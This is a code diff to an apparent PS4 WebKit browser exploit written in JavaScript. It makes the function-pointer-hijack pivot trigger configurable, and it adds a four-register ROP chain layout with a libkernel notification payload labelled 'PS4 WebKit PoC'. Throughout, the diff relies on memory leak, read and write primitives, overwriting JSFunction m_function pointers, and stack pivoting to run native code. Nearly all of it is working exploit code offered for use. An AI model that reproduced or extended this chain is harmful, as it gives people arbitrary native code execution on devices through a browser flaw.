@@ -5,6 +5,33 @@
 import { int64 } from "./int64.js";
 import { PIVOT_ROWS, verifyPivotSet, verifyPivotSetPrefix, checkPivotBytes } from "./pivot_gadgets.js";
 
+/** Builtin used to enter native path after G0→m_function hook. ?pivotfn=parseInt if expm1 OOMs. */
+const PIVOT_BUILTIN_MAP = {
+    expm1: function () { return Math.expm1; },
+    parseint: function () { return parseInt; },
+    parsefloat: function () { return parseFloat; },
+    sin: function () { return Math.sin; },
+    cos: function () { return Math.cos; },
+    abs: function () { return Math.abs; },
+};
+
+export function resolvePivotBuiltin(name) {
+    const key = (name || "expm1").toLowerCase().replace(/[^a-z]/g, "");
+    const get = PIVOT_BUILTIN_MAP[key];
+    if (!get) throw new Error("unknown pivotfn: " + name + " (try parseint|expm1|sin)");
+    const fn = get();
+    if (typeof fn !== "function") throw new Error("pivotfn not available: " + key);
+    return { fn, name: key };
+}
+
+export function firePivotTrigger(prep, argOverride) {
+    if (!prep) throw new Error("firePivotTrigger: no prep");
+    const trigger = prep.pivotTrigger || Math.expm1;
+    if (argOverride !== undefined) return trigger(argOverride);
+    if (prep.pivotFireArg !== undefined) return trigger(prep.pivotFireArg);
+    return trigger(prep.pivotObj);
+}
+
 export const SYS = { getpid: 20, getuid: 0x18 };
 
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
@@ -286,13 +313,14 @@ export function prepNativeChain(p, off, webkitBase, cap) {
     if (!slabOk.ok)
         throw new Error("prepNativeChain: slab content: " + slabOk.reasons.join("; "));
     let mainMf, mainOrig, pivotObj, pivotCell;
+    const pivotTrigger = (cap && cap.pivotTrigger) || Math.expm1;
     if (cap && cap.mainMf && cap.mainOrig != null) {
         mainMf = cap.mainMf;
         mainOrig = cap.mainOrig;
         pivotObj = cap.pivotObj;
         pivotCell = cap.pivotCell;
     } else {
-        const cell = p.leakval(Math.expm1);
+        const cell = p.leakval(pivotTrigger);
         const jfn = p.read8(cell.add32(0x18));
         mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
         mainOrig = p.read8(mainMf);
@@ -313,6 +341,8 @@ export function prepNativeChain(p, off, webkitBase, cap) {
         pivotObj,
         keepAlive,
         webkitBase,
+        pivotTrigger,
+        pivotBuiltinName: (cap && cap.pivotBuiltinName) || "expm1",
         staged: false,
         mainArmed: false,
         _pinMainMf: mainMf,
@@ -346,6 +376,92 @@ function layoutNativeCall(M, G, target, args) {
     const rsp = M.K.add32(at);
     put(M.pivotDv, M.pivotSp, rsp);
     return { at, rsp, insts: insts.length, targetIdx };
+}
+
+/** SysV AMD64 — rdi, rsi, rdx, rcx then direct libkernel call (PS4 notify/usleep-style). */
+function layoutNativeCall4(M, G, target, rdi, rsi, rdx, rcx) {
+    M.stackU8.fill(0);
+    M.frameU8.fill(0);
+    const insts = [
+        G.POP_RDI_RET, rdi,
+        G.POP_RSI_RET, rsi,
+        G.POP_RDX_RET, rdx,
+        G.POP_RCX_RET, rcx,
+        target,
+        G.POP_RDI_RET, M.F,
+        G.MOV_RDI_RAX_RET,
+        G.POP_RAX_RET, JSVALUE_UNDEFINED,
+        G.LEAVE_RET,
+    ];
+    const targetIdx = 8;
+    let at = STACK_SIZE - 8 * insts.length;
+    if (((M.K.low + at + 8 * targetIdx) & 0xf) !== 0)
+        at -= 8;
+    for (let i = 0; i < insts.length; i++)
+        put(M.stackDv, at + 8 * i, insts[i]);
+    const rsp = M.K.add32(at);
+    put(M.pivotDv, M.pivotSp, rsp);
+    return { at, rsp, insts: insts.length, targetIdx };
+}
+
+const NOTIFY_REQ_SIZE = 0xc30;
+const NOTIFY_MSG_OFF = 0x2d;
+const NOTIFY_ICON_OFF = 0x42d;
+const DEFAULT_NOTIFY_MSG = "PS4 WebKit PoC";
+const DEFAULT_NOTIFY_ICON = "cxml://psnotification/tex_icon_system";
+
+function writeNotifyStruct(p, addr, message, iconUri) {
+    message = message || DEFAULT_NOTIFY_MSG;
+    iconUri = iconUri || DEFAULT_NOTIFY_ICON;
+    p.write4(addr, new int64(0, 0));
+    p.write4(addr.add32(0x10), new int64(0xffffffff, 0));
+    p.write4(addr.add32(0x28), new int64(0, 0));
+    p.write4(addr.add32(0x2c), new int64(1, 0));
+    for (let i = 0; i < message.length; i++)
+        p.write1(addr.add32(NOTIFY_MSG_OFF + i), message.charCodeAt(i) & 0xff);
+    p.write1(addr.add32(NOTIFY_MSG_OFF + message.length), 0);
+    for (let j = 0; j < iconUri.length; j++)
+        p.write1(addr.add32(NOTIFY_ICON_OFF + j), iconUri.charCodeAt(j) & 0xff);
+    p.write1(addr.add32(NOTIFY_ICON_OFF + iconUri.length), 0);
+}
+
+function allocNotifyBuffer(p, addrOff, keepAlive) {
+    const ab = new ArrayBuffer(NOTIFY_REQ_SIZE + 0x10);
+    keepAlive.push(ab);
+    const native = bufAddr(p, addrOff, ab);
+    if (!native || native.hi < 0x80 || native.hi > 0x8f)
+        throw new Error("notify buffer: bufAddr failed");
+    return native;
+}
+
+export function stageNotify(p, prep, libkernelBase, off, opts) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("stageNotify: no prep");
+    opts = opts || {};
+    const fnOff = off.k_notify != null ? off.k_notify : 0x19320;
+    const message = opts.message || DEFAULT_NOTIFY_MSG;
+    const iconUri = opts.iconUri || DEFAULT_NOTIFY_ICON;
+    const addrOff = prep._bufAddrOff || resolveBufAddrOff(p, off);
+    if (!addrOff)
+        throw new Error("stageNotify: bufAddr chain missing");
+    prep._bufAddrOff = addrOff;
+    if (!prep.keepAlive) prep.keepAlive = [];
+    const buf = allocNotifyBuffer(p, addrOff, prep.keepAlive);
+    writeNotifyStruct(p, buf, message, iconUri);
+    prep.notifyBuf = buf;
+    prep._layout = layoutNativeCall4(
+        prep.M, prep.G, libkernelBase.add32(fnOff),
+        new int64(0, 0),
+        buf,
+        new int64(NOTIFY_REQ_SIZE, 0),
+        new int64(0, 0));
+    prep.staged = true;
+    prep.stagedKind = "notify";
+}
+
+export function fireNotify(p, prep, libkernelBase, off, opts) {
+    stageNotify(p, prep, libkernelBase, off, opts);
+    return fireNativeCall(p, prep, off, opts && opts.fireOpts);
 }
 
 export function layoutGetpidSlab(M, G, stub) {
@@ -929,15 +1045,15 @@ export function bisectFirePoopsStyle(p, prep, hookOffs, opts) {
     }
     if (!opts.skipHook)
         bisectHookPivotMulti(p, prep, hookOffs);
-    Math.expm1(prep.pivotObj);
+    firePivotTrigger(prep);
     return prep.M.frameDv.getUint32(0, true) | 0;
 }
 
-/** Bisect step 5 — Math.expm1 pivot (runs ROP chain). */
+/** Bisect step 5 — pivot builtin trigger (runs ROP chain). */
 export function bisectFireExpm1(p, prep) {
     if (!prep || !prep.pivotObj)
         throw new Error("bisectFireExpm1: no prep");
-    Math.expm1(prep.pivotObj);
+    firePivotTrigger(prep);
 }
 
 /** Restore poisoned pivot slots only (main m_function untouched). */
@@ -1037,7 +1153,7 @@ export function fireNativeCall(p, prep, off, opts) {
         prep.mainArmed = true;
     }
     applyPivotHook(p, prep, off, opts);
-    Math.expm1(prep.pivotObj);
+    firePivotTrigger(prep);
     restorePivotHook(p, prep);
     p.write8(prep.mainMf, prep.mainOrig);
     prep.mainArmed = false;
